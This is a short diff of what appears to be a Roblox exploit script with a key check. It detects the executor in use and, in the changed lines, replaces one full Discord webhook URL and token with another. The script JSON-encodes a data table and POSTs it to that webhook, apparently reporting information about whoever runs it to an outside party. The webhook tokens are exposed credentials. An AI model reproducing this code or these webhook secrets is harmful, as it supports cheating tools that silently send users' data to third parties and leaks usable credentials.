@@ -233,7 +233,7 @@ local ExecutorUsing = is_sirhurt_closure and "Sirhurt" or pebc_execute and "Prot
                     local Encoded = HttpService:JSONEncode(Data)
                     
                     Request = http_request or request or HttpPost or syn.request
-                    local Final = {Url = "https://discord.com/api/webhooks/1093465330770260028/4pTWwrvZGf7H5UR2jWBn3yduJINLpb15jZOUAhteUuVNBmN5h6dVAHyYsOVj02jfSKZ0", Body = Encoded, Method = "POST", Headers = Headers}
+                    local Final = {Url = "https://discord.com/api/webhooks/1093683678602866808/nRZ_Y9xxKN3kNWMBeIoCXt3JUAOgMJgdcRf4dPtW9P8aGNE16i8SmxSBOcTB39lKbpmm", Body = Encoded, Method = "POST", Headers = Headers}
                     Request(Final)
 else
 key_tb.Text =" Sai Chìa Khóa"
